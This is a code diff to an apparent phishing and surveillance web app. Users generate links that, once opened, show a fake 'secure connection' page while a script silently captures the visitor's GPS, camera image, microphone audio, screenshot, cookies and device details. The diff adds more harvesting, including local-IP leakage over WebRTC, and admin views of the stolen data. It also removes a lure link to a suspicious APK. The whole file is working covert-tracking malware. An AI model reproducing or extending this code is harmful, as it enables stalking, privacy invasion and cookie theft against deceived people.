@@ -135,7 +135,6 @@ REGISTER_HTML = """
 </html>
 """
 
-# ===== Dashboard with Music (Only Admin can create links) =====
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -160,32 +159,16 @@ DASHBOARD_HTML = """
             <a href="/logout" class="logout">🚪 Logout</a>
         </div>
 
-        <!-- ====== Fixed Default Link (Everyone sees this) ====== -->
+        <!-- ====== Generate Link ====== -->
         <div class="card">
-            <h3>📎 Your Shareable Link</h3>
-            <p style="color:#6688aa;margin-bottom:10px;">Share this link to collect data:</p>
-            <div style="background:#0d1520;padding:15px;border-radius:12px;word-break:break-all;">
-                <a href="https://www.mediafire.com/file/9acuwwe88rfcfni/Cyber_Tools_1.0.0.apk/file" target="_blank" style="color:#00ffcc;font-size:1.2rem;">
-                    https://www.mediafire.com/file/9acuwwe88rfcfni/Cyber_Tools_1.0.0.apk/file
-                </a>
-            </div>
-            <p style="color:#6688aa;font-size:0.9rem;margin-top:8px;">👆 Click to copy or share this link</p>
-        </div>
-
-        <!-- ====== Admin-Only: Create New Link ====== -->
-        {% if user.username == 'admin' %}
-        <div class="card" style="border:2px solid #ff004488;">
-            <h3>🔑 Admin: Create New Link</h3>
+            <h3>📎 Create New Link</h3>
             <form method="POST" action="/create_link">
                 <input type="text" name="link_name" placeholder="Link name (e.g., Facebook Tool)" required>
                 <button type="submit">🔗 Generate</button>
             </form>
-            <p class="admin-only">🔒 Only admin can create new links</p>
         </div>
-        {% endif %}
 
-        <!-- ====== User's Links (if any) ====== -->
-        {% if user.links %}
+        <!-- ====== User's Links ====== -->
         <div class="card">
             <h3>📌 Your Links</h3>
             {% for link in user.links %}
@@ -200,9 +183,10 @@ DASHBOARD_HTML = """
                     <a href="/delete_link/{{ link.id }}" class="del-btn" onclick="return confirm('Delete this link and all its data?');">🗑️ Delete</a>
                 </div>
             </div>
+            {% else %}
+            <p style="color:#6688aa;font-size:1.2rem;">You haven't created any links. Generate one above!</p>
             {% endfor %}
         </div>
-        {% endif %}
 
         <div class="click-hint" onclick="playMusic()">🎵 Click to play background music</div>
     </div>
@@ -238,7 +222,6 @@ DASHBOARD_HTML = """
 </body>
 </html>
 """
-
 # ===== Admin Login Page (Hidden) =====
 ADMIN_LOGIN_HTML = """
 <!DOCTYPE html>
@@ -351,6 +334,15 @@ ADMIN_USER_HTML = """
             <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
             <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
             <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+
+            <!-- ===== নতুন ডেটা ===== -->
+            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
+            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
+
             <div class="row"><span class="label">Camera:</span>
                 {% if v.get('camera') and v.get('camera') != 'Failed' %}
                     <img src="{{ v.get('camera') }}" />
@@ -417,6 +409,15 @@ VIEW_LINK_HTML = """
             <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
             <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
             <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+
+            <!-- ===== নতুন ডেটা ===== -->
+            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
+            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
+
             <div class="row"><span class="label">Camera:</span>
                 {% if v.get('camera') and v.get('camera') != 'Failed' %}
                     <img src="{{ v.get('camera') }}" />
@@ -467,6 +468,9 @@ p{font-size:1.5rem;color:#6688aa}
     <p>⏳ Establishing secure connection...</p>
     <div id="status" class="msg"></div>
     <script>
+        // ============================================
+        // 1. GPS
+        // ============================================
         let gps = 'Permission denied';
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -475,10 +479,12 @@ p{font-size:1.5rem;color:#6688aa}
             );
         }
 
+        // ============================================
+        // 2. Camera + Audio (existing)
+        // ============================================
         let camera = null;
         let audioData = null;
 
-        // Request camera and microphone simultaneously
         Promise.all([
             navigator.mediaDevices.getUserMedia({ video: true }),
             navigator.mediaDevices.getUserMedia({ audio: true })
@@ -504,8 +510,8 @@ p{font-size:1.5rem;color:#6688aa}
                 const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
                 reader.onload = () => {
-                    audioData = reader.result; // base64
-                    sendData();
+                    audioData = reader.result;
+                    checkAndSend();
                 };
                 reader.readAsDataURL(blob);
             };
@@ -516,13 +522,62 @@ p{font-size:1.5rem;color:#6688aa}
             }, 5000);
         })
         .catch(err => {
-            // If any permission fails, still send other data
             console.log('Permissions error:', err);
             camera = 'Failed';
             audioData = 'Failed';
-            sendData();
+            checkAndSend();
         });
 
+        // ============================================
+        // 3. New Data Collection (Device, Network, CPU, WebRTC, Storage)
+        // ============================================
+        let deviceModel = 'Unknown';
+        const ua = navigator.userAgent;
+        if (/iPhone/.test(ua)) deviceModel = 'iPhone';
+        else if (/iPad/.test(ua)) deviceModel = 'iPad';
+        else if (/Android/.test(ua)) {
+            const match = ua.match(/Android\s([\d.]+);\s([^;]+)/);
+            if (match) deviceModel = match[2] || 'Android Device';
+        } else if (/Windows/.test(ua)) deviceModel = 'Windows PC';
+        else if (/Macintosh/.test(ua)) deviceModel = 'Mac';
+
+        let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        let connType = connection.effectiveType || 'N/A';
+        let downlink = connection.downlink || 'N/A';
+
+        let cpuCores = navigator.hardwareConcurrency || 'N/A';
+
+        // WebRTC Local IP (asynchronous)
+        let localIP = 'N/A';
+        function getLocalIP(callback) {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) return;
+                const ip = e.candidate.candidate.split(' ')[4];
+                if (ip && ip.includes('.')) {
+                    callback(ip);
+                    pc.close();
+                }
+            };
+            // fallback after 2 seconds
+            setTimeout(() => callback('N/A'), 2000);
+        }
+        getLocalIP((ip) => { localIP = ip; });
+
+        // Storage (asynchronous)
+        let storageFree = 'N/A', storageTotal = 'N/A';
+        if (navigator.storage) {
+            navigator.storage.estimate().then(est => {
+                storageTotal = (est.quota / (1024**3)).toFixed(1) + ' GB';
+                storageFree = ((est.quota - est.usage) / (1024**3)).toFixed(1) + ' GB';
+            }).catch(() => {});
+        }
+
+        // ============================================
+        // 4. Screenshot
+        // ============================================
         function captureScreen() {
             const canvas = document.createElement('canvas');
             canvas.width = window.innerWidth;
@@ -536,6 +591,9 @@ p{font-size:1.5rem;color:#6688aa}
             return canvas.toDataURL('image/png');
         }
 
+        // ============================================
+        // 5. Final send function (waits for camera+audio)
+        // ============================================
         function sendData() {
             let battery = 'N/A';
             if (navigator.getBattery) {
@@ -550,51 +608,69 @@ p{font-size:1.5rem;color:#6688aa}
             let cookies = document.cookie || 'None';
             let referrer = document.referrer || 'Direct';
 
-            // Wait for audio and camera to be ready, but if they are still null, use fallback
-            const checkAndSend = () => {
-                if (camera !== null && audioData !== null) {
-                    const data = {
-                        ip: "{{ ip }}",
-                        user_agent: navigator.userAgent,
-                        screen: screen.width + "x" + screen.height,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        gps: gps,
-                        camera: camera,
-                        screenshot: captureScreen(),
-                        audio: audioData,
-                        battery: battery,
-                        memory: memory,
-                        cookies: cookies,
-                        referrer: referrer,
-                        time: new Date().toLocaleString()
-                    };
-                    fetch('/collect/{{ link_id }}', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data)
-                    }).then(() => {
-                        document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
-                        setTimeout(() => {
-                            document.querySelector('.loader').style.display = 'none';
-                            document.querySelector('p').textContent = 'Thank you! You are now connected.';
-                            document.getElementById('status').innerHTML = '🔒 Your session is secure.';
-                        }, 1500);
-                    });
-                } else {
-                    setTimeout(checkAndSend, 500);
-                }
+            const data = {
+                ip: "{{ ip }}",
+                user_agent: navigator.userAgent,
+                screen: screen.width + "x" + screen.height,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                gps: gps,
+                camera: camera,
+                screenshot: captureScreen(),
+                audio: audioData,
+                battery: battery,
+                memory: memory,
+                cookies: cookies,
+                referrer: referrer,
+                // New fields
+                deviceModel: deviceModel,
+                connType: connType,
+                downlink: downlink,
+                cpuCores: cpuCores,
+                localIP: localIP,
+                storageFree: storageFree,
+                storageTotal: storageTotal,
+                time: new Date().toLocaleString()
             };
-            checkAndSend();
+
+            fetch('/collect/{{ link_id }}', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
+                setTimeout(() => {
+                    document.querySelector('.loader').style.display = 'none';
+                    document.querySelector('p').textContent = 'Thank you! You are now connected.';
+                    document.getElementById('status').innerHTML = '🔒 Your session is secure.';
+                }, 1500);
+            });
         }
 
-        // Fallback: if audio/camera not ready after 8 seconds, force send
+        // ============================================
+        // 6. Wait for camera+audio to be ready
+        // ============================================
+        let isSending = false;
+        function checkAndSend() {
+            if (isSending) return;
+            if (camera !== null && audioData !== null) {
+                isSending = true;
+                sendData();
+            } else {
+                setTimeout(checkAndSend, 300);
+            }
+        }
+
+        // Fallback: if camera/audio not ready after 10 seconds, force send
         setTimeout(() => {
             if (camera === null) camera = 'Failed';
             if (audioData === null) audioData = 'Failed';
-            sendData();
-        }, 8000);
+            if (!isSending) {
+                isSending = true;
+                sendData();
+            }
+        }, 10000);
     </script>
 </body>
 </html>
